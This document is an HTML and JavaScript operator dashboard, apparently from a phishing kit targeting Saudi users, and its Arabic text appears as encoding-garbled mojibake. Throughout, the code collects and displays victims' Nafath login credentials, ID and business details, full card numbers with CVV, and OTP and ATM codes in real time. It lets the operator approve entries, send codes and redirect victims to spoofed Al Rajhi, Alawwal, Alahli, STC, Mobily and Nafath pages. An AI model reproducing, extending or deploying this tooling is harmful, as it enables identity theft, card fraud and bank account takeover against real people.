<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… - Ø³Ø¬Ù„</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
    body { font-family: 'Tajawal', sans-serif; }
    .visitor-card { transition: all 0.3s ease; }
    .visitor-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
    .pulse { animation: pulse 2s infinite; }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .waiting-badge { animation: blink 1s infinite; }
    @keyframes blink {
      0%, 100% { background-color: #fef3c7; }
      50% { background-color: #fde68a; }
    }
    .data-section { border-right: 4px solid #3b82f6; }
    .disconnected { opacity: 0.6; }
  </style>
</head>
<body class="bg-gray-100 min-h-screen">
  <!-- Login Modal -->
  <div id="loginModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
    <div class="bg-white rounded-xl p-8 max-w-md w-full mx-4">
      <h2 class="text-2xl font-bold text-center mb-6">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h2>
      <form id="loginForm">
        <div class="mb-4">
          <label class="block text-gray-700 mb-2">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
          <input type="password" id="password" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
        </div>
        <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">Ø¯Ø®ÙˆÙ„</button>
      </form>
      <p id="loginError" class="text-red-500 text-center mt-4 hidden">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­Ø©</p>
    </div>
  </div>

  <!-- Main Dashboard -->
  <div id="dashboard" class="hidden">
    <!-- Header -->
    <header class="bg-white shadow-sm">
      <div class="container mx-auto px-4 py-4 flex justify-between items-center">
        <h1 class="text-2xl font-bold text-gray-800">Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h1>
        <div class="flex items-center gap-4">
          <span id="connectionStatus" class="flex items-center gap-2">
            <span class="w-3 h-3 bg-green-500 rounded-full pulse"></span>
            <span class="text-green-600">Ù…ØªØµÙ„</span>
          </span>
          <span id="visitorCount" class="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm">0 Ø²Ø§Ø¦Ø±</span>
        </div>
      </div>
    </header>

    <div class="container mx-auto px-4 py-6 flex gap-6">
      <!-- Visitors List -->
      <div class="w-1/3">
        <div class="bg-white rounded-xl shadow-sm p-4">
          <h2 class="text-lg font-bold mb-4">Ø§Ù„Ø²ÙˆØ§Ø±</h2>
          <div id="visitorsList" class="space-y-3 max-h-[calc(100vh-200px)] overflow-y-auto">
            <p class="text-gray-500 text-center py-8">Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø²ÙˆØ§Ø± Ø­Ø§Ù„ÙŠØ§Ù‹</p>
          </div>
        </div>
      </div>

      <!-- Visitor Details -->
      <div class="w-2/3">
        <div id="visitorDetails" class="bg-white rounded-xl shadow-sm p-6">
          <div class="text-center py-12 text-gray-500">
            <svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
            </svg>
            <p>Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Socket connection
    const SOCKET_URL = window.location.hostname === 'localhost' 
      ? 'http://localhost:3001' 
      : window.location.origin;
    
    let socket;
    let visitors = new Map();
    let selectedVisitorId = null;

    // DOM Elements
    const loginModal = document.getElementById('loginModal');
    const loginForm = document.getElementById('loginForm');
    const loginError = document.getElementById('loginError');
    const dashboard = document.getElementById('dashboard');
    const visitorsList = document.getElementById('visitorsList');
    const visitorDetails = document.getElementById('visitorDetails');
    const visitorCount = document.getElementById('visitorCount');

    // Login handler
    loginForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const password = document.getElementById('password').value;
      
      socket = io(SOCKET_URL, {
        transports: ['websocket', 'polling'],
      });

      socket.on('connect', () => {
        socket.emit('admin:register', { password });
      });

      socket.on('admin:authenticated', (success) => {
        if (success) {
          loginModal.classList.add('hidden');
          dashboard.classList.remove('hidden');
          setupSocketListeners();
        } else {
          loginError.classList.remove('hidden');
        }
      });
    });

    // Setup socket listeners
    function setupSocketListeners() {
      socket.on('visitors:list', (list) => {
        list.forEach(v => visitors.set(v._id, v));
        renderVisitorsList();
      });

      socket.on('visitor:new', (visitor) => {
        // Ensure new visitor is marked as connected
        visitor.isConnected = true;
        visitors.set(visitor._id, visitor);
        renderVisitorsList();
        showNotification('Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯: ' + visitor.visitorNumber);
      });

      socket.on('visitor:pageChanged', ({ visitorId, page }) => {
        const visitor = visitors.get(visitorId);
        if (visitor) {
          visitor.page = page;
          visitors.set(visitorId, visitor);
          renderVisitorsList();
          if (selectedVisitorId === visitorId) {
            renderVisitorDetails(visitor);
          }
        }
      });

      socket.on('visitor:dataSubmitted', ({ visitorId, data, visitor }) => {
        // Ensure visitor is marked as connected and update data
        visitor.isConnected = true;
        visitors.set(visitorId, visitor);
        renderVisitorsList();
        // Always update details if this visitor is selected
        if (selectedVisitorId === visitorId) {
          renderVisitorDetails(visitor);
        }
        // Show notification with sound
        showNotification('ğŸ“ Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø§Ù„Ø²Ø§Ø¦Ø± #' + visitor.visitorNumber);
        // Play notification sound
        try {
          const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQAAAAAAAAAAAA==');
          audio.volume = 0.5;
          audio.play().catch(() => {});
        } catch(e) {}
      });

      socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
        const visitor = visitors.get(visitorId);
        if (visitor) {
          visitor.isConnected = false;
          visitors.set(visitorId, visitor);
          renderVisitorsList();
          if (selectedVisitorId === visitorId) {
            renderVisitorDetails(visitor);
          }
        }
      });

      socket.on('visitor:reconnected', ({ visitorId, socketId }) => {
        const visitor = visitors.get(visitorId);
        if (visitor) {
          visitor.isConnected = true;
          visitor.socketId = socketId;
          visitors.set(visitorId, visitor);
          renderVisitorsList();
          if (selectedVisitorId === visitorId) {
            renderVisitorDetails(visitor);
          }
        }
      });
    }

    // Render visitors list
    function renderVisitorsList() {
      const list = Array.from(visitors.values()).sort((a, b) => b.visitorNumber - a.visitorNumber);
      const connectedCount = list.filter(v => v.isConnected === true).length;
      visitorCount.textContent = connectedCount + ' Ù†Ø´Ø· / ' + list.length + ' Ø²Ø§Ø¦Ø±';

      if (list.length === 0) {
        visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø²ÙˆØ§Ø± Ø­Ø§Ù„ÙŠØ§Ù‹</p>';
        return;
      }

      visitorsList.innerHTML = list.map(v => {
        const isSelected = selectedVisitorId === v._id;
        const isDisconnected = v.isConnected !== true;
        return '<div class="visitor-card p-4 rounded-lg border cursor-pointer ' + 
          (isSelected ? 'border-blue-500 bg-blue-50' : 'border-gray-200 hover:border-gray-300') + 
          (isDisconnected ? ' disconnected' : '') + 
          '" onclick="selectVisitor(\'' + v._id + '\')">' +
          '<div class="flex justify-between items-start mb-2">' +
          '<span class="font-bold">#' + v.visitorNumber + '</span>' +
          '<div class="flex items-center gap-2">' +
          (isDisconnected ? '<span class="w-2 h-2 bg-red-500 rounded-full" title="ØºÙŠØ± Ù…ØªØµÙ„"></span>' : '<span class="w-2 h-2 bg-green-500 rounded-full" title="Ù…ØªØµÙ„"></span>') +
          '<span class="text-xs px-2 py-1 rounded-full ' + (v.waitingForAdminResponse ? 'waiting-badge text-yellow-800' : 'bg-gray-100 text-gray-600') + '">' + v.page + '</span>' +
          '</div></div>' +
          '<div class="text-sm text-gray-500"><p>' + v.ip + '</p><p>' + v.device + ' - ' + v.browser + '</p></div>' +
          (v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium">â³ ÙŠÙ†ØªØ¸Ø± Ø§Ù„Ø±Ø¯</div>' : '') +
          (Object.keys(v.data || {}).length > 0 ? '<div class="mt-2 text-xs text-blue-700 font-medium">ğŸ“ ÙŠÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª</div>' : '') +
          '</div>';
      }).join('');
    }

    // Select visitor
    function selectVisitor(visitorId) {
      selectedVisitorId = visitorId;
      const visitor = visitors.get(visitorId);
      if (visitor) {
        renderVisitorDetails(visitor);
        renderVisitorsList();
      }
    }

    // Render visitor details
    function renderVisitorDetails(visitor) {
      let html = '<div class="space-y-6">';
      
      // Header
      html += '<div class="flex justify-between items-start"><div>';
      html += '<h2 class="text-2xl font-bold">Ø²Ø§Ø¦Ø± #' + visitor.visitorNumber + '</h2>';
      html += '<p class="text-gray-500">' + visitor.page + '</p>';
      html += '<div class="flex items-center gap-2 mt-2">';
      html += visitor.isConnected !== true ? 
        '<span class="inline-block px-3 py-1 bg-red-100 text-red-800 rounded-full text-sm font-medium">ğŸ”´ ØºÙŠØ± Ù…ØªØµÙ„</span>' : 
        '<span class="inline-block px-3 py-1 bg-green-100 text-green-800 rounded-full text-sm font-medium">ğŸŸ¢ Ù…ØªØµÙ„</span>';
      if (visitor.waitingForAdminResponse) {
        html += '<span class="inline-block px-3 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm font-medium">â³ ÙŠÙ†ØªØ¸Ø± Ø§Ù„Ø±Ø¯</span>';
      }
      html += '</div></div>';
      
      // Action buttons
      html += '<div class="flex gap-2">';
      html += '<button onclick="approveForm(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 flex items-center gap-2"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>';
      html += '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>Ù…ÙˆØ§ÙÙ‚Ø©</button>';
      html += '<button onclick="rejectForm(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 flex items-center gap-2"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>';
      html += '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>Ø±ÙØ¶</button>';
      html += '</div></div>';

      // Info Grid
      html += '<div class="grid grid-cols-2 gap-4">';
      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">IP</p><p class="font-medium">' + visitor.ip + '</p></div>';
      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">Ø§Ù„Ø¬Ù‡Ø§Ø²</p><p class="font-medium">' + visitor.device + ' - ' + visitor.os + '</p></div>';
      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">Ø§Ù„Ù…ØªØµÙØ­</p><p class="font-medium">' + visitor.browser + '</p></div>';
      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">Ø§Ù„Ø¯ÙˆÙ„Ø©</p><p class="font-medium">' + visitor.country + '</p></div>';
      html += '</div>';

      // Display data history in reverse order (newest first)
      if (visitor.dataHistory && visitor.dataHistory.length > 0) {
        const reversedHistory = [...visitor.dataHistory].reverse();
        reversedHistory.forEach((entry, index) => {
          const bgColor = index % 2 === 0 ? 'bg-blue-50' : 'bg-teal-50';
          const borderColor = index % 2 === 0 ? '#3b82f6' : '#14b8a6';
          const textColor = index % 2 === 0 ? 'text-blue-800' : 'text-teal-800';
          
          html += '<div class="data-section ' + bgColor + ' p-4 rounded-lg" style="border-right-color: ' + borderColor + ';">';
          html += '<h3 class="font-bold mb-3 ' + textColor + '">ğŸ“‹ ' + (entry.page || 'Ø¨ÙŠØ§Ù†Ø§Øª') + '</h3>';
          html += '<div class="grid grid-cols-2 gap-3">';
          Object.entries(entry.content).forEach(([key, value]) => {
            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
          });
          html += '</div></div>';
        });
      } else if (visitor.data && Object.keys(visitor.data).length > 0) {
        // Fallback to old data format
        const nafathData = {};
        const updateInfoData = {};
        const otherData = {};
        
        const updateInfoKeys = ['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ', 'Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¥Ù†Ø¬Ù„ÙŠØ²ÙŠ', 'Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„ÙˆØ·Ù†ÙŠØ©', 'ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯', 'Ø§Ù„Ø¬Ù†Ø³ÙŠØ©', 'Ù†ÙˆØ¹ Ø§Ù„Ù…Ø§Ù„Ùƒ', 'Ø§Ù„Ø¬Ù†Ø³',
          'Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„', 'Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ', 'Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„ÙˆØ·Ù†ÙŠ', 'Ø±Ù‚Ù… Ø§Ù„Ù…Ø¨Ù†Ù‰', 'Ø±Ù‚Ù… Ø§Ù„Ø·Ø§Ø¨Ù‚',
          'Ø§Ù„Ù†Ø´Ø§Ø· Ø§Ù„Ø¹Ø§Ù…', 'Ø§Ù„Ù†Ø´Ø§Ø· Ø§Ù„Ø®Ø§Øµ', 'Ø±Ø£Ø³ Ø§Ù„Ù…Ø§Ù„',
          'Ø¹Ù„Ø§Ù…Ø© ØªØ¬Ø§Ø±ÙŠØ©', 'Ø§Ø³Ù… Ø§Ù„Ø¹Ù„Ø§Ù…Ø©', 'Ø§Ø³Ù… Ø§Ù„Ù…Ø­Ù„', 'Ø±Ù‚Ù… Ø§Ù„Ù…Ø­Ù„', 'Ø±Ù‚Ù… Ø§Ù„Ø¹Ù‚Ø§Ø±', 'Ø¹Ø¯Ø¯ Ø§Ù„ÙØªØ­Ø§Øª', 'Ø¹Ø¯Ø¯ Ø§Ù„Ø·ÙˆØ§Ø¨Ù‚', 'Ø¹Ø¯Ø¯ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª', 'Ù…ØµØ¹Ø¯', 'Ø¯Ø§Ø®Ù„ Ù…Ø¬Ù…Ø¹ ØªØ¬Ø§Ø±ÙŠ', 'Ù†ÙˆØ¹ Ø§Ù„Ø¹Ù‚Ø¯',
          'Ù†ÙˆØ¹ Ø§Ù„Ù„ÙˆØ­Ø©', 'Ù…Ø³Ø§Ø­Ø© Ø§Ù„Ù„ÙˆØ­Ø©', 'Ù†ÙˆØ¹ Ø§Ù„Ù…Ø³Ø§Ø±',
          'Ù†ÙˆØ¹ Ø§Ù„Ø§Ø³Ù…', 'Ø§Ù„Ø§Ø³Ù… Ø§Ù„ØªØ¬Ø§Ø±ÙŠ', 'Ø§Ø³Ù… Ø§Ù„Ø¹Ù„Ø§Ù…Ø© Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ', 'Ø§Ø³Ù… Ø§Ù„Ø¹Ù„Ø§Ù…Ø© Ø¨Ø§Ù„Ø¥Ù†Ø¬Ù„ÙŠØ²ÙŠ',
          'Ø§Ø³Ù… Ø§Ù„Ø®Ø¯Ù…Ø©', 'Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨', 'Ø±Ù‚Ù… Ø§Ù„Ø³Ø¬Ù„ Ø§Ù„ØªØ¬Ø§Ø±ÙŠ'];
        
        Object.entries(visitor.data).forEach(([key, value]) => {
          if (['Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… / Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„ÙˆØ·Ù†ÙŠØ©', 'ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± (Ù†ÙØ§Ø°)'].includes(key)) {
            nafathData[key] = value;
          } else if (updateInfoKeys.includes(key)) {
            updateInfoData[key] = value;
          } else {
            otherData[key] = value;
          }
        });

        // Update Info Data Section (shown first - newer data)
        if (Object.keys(updateInfoData).length > 0) {
          html += '<div class="data-section bg-blue-50 p-4 rounded-lg">';
          html += '<h3 class="font-bold mb-3 text-blue-800">ğŸ“‹ Ø¨ÙŠØ§Ù†Ø§Øª ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</h3>';
          html += '<div class="grid grid-cols-2 gap-3">';
          Object.entries(updateInfoData).forEach(([key, value]) => {
            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
          });
          html += '</div></div>';
        }

        // Nafath Data Section (shown second - older data)
        if (Object.keys(nafathData).length > 0) {
          html += '<div class="data-section bg-teal-50 p-4 rounded-lg" style="border-right-color: #14b8a6;">';
          html += '<h3 class="font-bold mb-3 text-teal-800">ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ù†ÙØ§Ø°</h3>';
          html += '<div class="grid grid-cols-2 gap-3">';
          Object.entries(nafathData).forEach(([key, value]) => {
            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
          });
          html += '</div></div>';
        }
        
        // Other Data Section
        if (Object.keys(otherData).length > 0) {
          html += '<div class="data-section bg-gray-50 p-4 rounded-lg">';
          html += '<h3 class="font-bold mb-3 text-gray-800">ğŸ“ Ø¨ÙŠØ§Ù†Ø§Øª Ø£Ø®Ø±Ù‰</h3>';
          html += '<div class="grid grid-cols-2 gap-3">';
          Object.entries(otherData).forEach(([key, value]) => {
            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
          });
          html += '</div></div>';
        }
      }

      // Payment Cards
      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
        html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
        html += '<h3 class="font-bold mb-3 text-purple-800">ğŸ’³ Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ø¯ÙØ¹</h3>';
        html += '<div class="space-y-3">';
        visitor.paymentCards.forEach((card, i) => {
          html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
          html += '<p class="font-medium mb-2 text-purple-700">Ø¨Ø·Ø§Ù‚Ø© ' + (i + 1) + '</p>';
          html += '<div class="grid grid-cols-2 gap-3 text-sm">';
          html += '<div><span class="text-gray-500">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
          html += '<div><span class="text-gray-500">Ø§Ù„Ø§Ø³Ù…:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
          html += '<div><span class="text-gray-500">Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
          html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
          html += '</div></div>';
        });
        html += '</div></div>';
      }

      // Digit Codes
      if (visitor.digitCodes && visitor.digitCodes.length > 0) {
        html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
        html += '<h3 class="font-bold mb-3 text-orange-800">ğŸ”¢ Ø§Ù„Ø±Ù…ÙˆØ² Ø§Ù„Ù…Ø¯Ø®Ù„Ø©</h3>';
        html += '<div class="space-y-2">';
        visitor.digitCodes.forEach(dc => {
          html += '<div class="flex justify-between items-center bg-white p-3 rounded-lg">';
          html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
          html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
          html += '</div>';
        });
        html += '</div></div>';
      }

      // Actions
      html += '<div class="border-t pt-4"><h3 class="font-bold mb-3">Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</h3>';
      html += '<div class="grid grid-cols-2 gap-4">';
      
      // Send Code
      html += '<div><label class="block text-sm text-gray-500 mb-1">Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø²</label>';
      html += '<div class="flex gap-2"><input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù…Ø²">';
      html += '<button onclick="sendCode(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">Ø¥Ø±Ø³Ø§Ù„</button></div></div>';
      
      // Navigate
      html += '<div><label class="block text-sm text-gray-500 mb-1">ØªÙˆØ¬ÙŠÙ‡ Ù„ØµÙØ­Ø©</label>';
      html += '<div class="flex gap-2"><select id="navigateSelect" class="flex-1 px-3 py-2 border rounded-lg">';
      html += '<option value="">Ø§Ø®ØªØ± ØµÙØ­Ø©</option>';
      html += '<option value="credit-card-payment">Ø§Ù„Ø¯ÙØ¹ Ø¨Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</option>';
      html += '<option value="otp-verification">OTP Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</option>';
      html += '<option value="atm-password">ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± ATM</option>';
      html += '<option value="phone-verification">ØªÙˆØ«ÙŠÙ‚ Ø§Ù„Ø¬ÙˆØ§Ù„</option>';
      html += '<option value="phone-otp">OTP Ø§Ù„Ø¬ÙˆØ§Ù„</option>';
      html += '<option value="stc-call-alert">ØªÙ†Ø¨ÙŠÙ‡ STC</option>';
      html += '<option value="mobily-call-alert">ØªÙ†Ø¨ÙŠÙ‡ Mobily</option>';
      html += '<option value="nafath-login-page">Ù†ÙØ§Ø°</option>';
      html += '<option value="nafath-verify">ØªØ­Ù‚Ù‚ Ù†ÙØ§Ø°</option>';
      html += '<option value="alrajhi-login">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„</option>';
      html += '<option value="alrajhi-otp">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - OTP</option>';
      html += '<option value="alrajhi-nafath">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - Ù†ÙØ§Ø°</option>';
      html += '<option value="alrajhi-alert">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - ØªÙ†Ø¨ÙŠÙ‡</option>';
      html += '<option value="alrajhi-call">Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ - Ø§ØªØµØ§Ù„</option>';
      html += '<option value="alawwal-bank">Ø¨Ù†Ùƒ Ø§Ù„Ø£ÙˆÙ„</option>';
      html += '<option value="alawwal-nafath">Ø§Ù„Ø£ÙˆÙ„ - Ù†ÙØ§Ø°</option>';
      html += '<option value="alahli-otp">Ø§Ù„Ø£Ù‡Ù„ÙŠ - OTP</option>';
      html += '<option value="bank-transfer">Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨Ù†ÙƒÙŠ</option>';
      html += '<option value="bank-account-number">Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨</option>';
      html += '<option value="mystc-otp">MyStc OTP</option>';
      html += '<option value="final-page">Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©</option>';
      html += '</select>';
      html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">ØªÙˆØ¬ÙŠÙ‡</button></div></div>';
      
      html += '</div>';
      
      // Send Message
      html += '<div class="mt-4"><label class="block text-sm text-gray-500 mb-1">Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ù†Ù‡Ø§Ø¦ÙŠØ©</label>';
      html += '<div class="flex gap-2"><input type="text" id="messageInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©">';
      html += '<button onclick="sendMessage(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">Ø¥Ø±Ø³Ø§Ù„</button></div></div>';
      
      // Block and Delete
      html += '<div class="flex gap-2 mt-4">';
      html += '<button onclick="blockVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700">Ø­Ø¸Ø±</button>';
      html += '<button onclick="deleteVisitor(\'' + visitor._id + '\')" class="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700">Ø­Ø°Ù</button>';
      html += '</div></div>';

      html += '</div>';
      
      visitorDetails.innerHTML = html;
    }

    // Action functions
    function approveForm(socketId) {
      socket.emit('admin:approve', { visitorSocketId: socketId });
    }

    function rejectForm(socketId) {
      socket.emit('admin:reject', { visitorSocketId: socketId });
    }

    function sendCode(socketId) {
      const code = document.getElementById('codeInput').value;
      if (code) {
        socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
        document.getElementById('codeInput').value = '';
      }
    }

    function navigateVisitor(socketId) {
      const page = document.getElementById('navigateSelect').value;
      if (page) {
        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
      }
    }

    function sendMessage(socketId) {
      const message = document.getElementById('messageInput').value;
      if (message) {
        socket.emit('admin:sendMessage', { visitorSocketId: socketId, message });
        document.getElementById('messageInput').value = '';
      }
    }

    function blockVisitor(socketId) {
      if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø¸Ø± Ù‡Ø°Ø§ Ø§Ù„Ø²Ø§Ø¦Ø±ØŸ')) {
        socket.emit('admin:block', { visitorSocketId: socketId });
      }
    }

    function deleteVisitor(visitorId) {
      if (confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ù‡Ø°Ø§ Ø§Ù„Ø²Ø§Ø¦Ø±ØŸ')) {
        socket.emit('admin:deleteById', visitorId);
        visitors.delete(visitorId);
        selectedVisitorId = null;
        renderVisitorsList();
        visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p></div>';
      }
    }

    // Notification
    function showNotification(message) {
      if (Notification.permission === 'granted') {
        new Notification('Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…', { body: message });
      }
    }

    // Request notification permission
    if ('Notification' in window) {
      Notification.requestPermission();
    }
  </script>
</body>
</html>
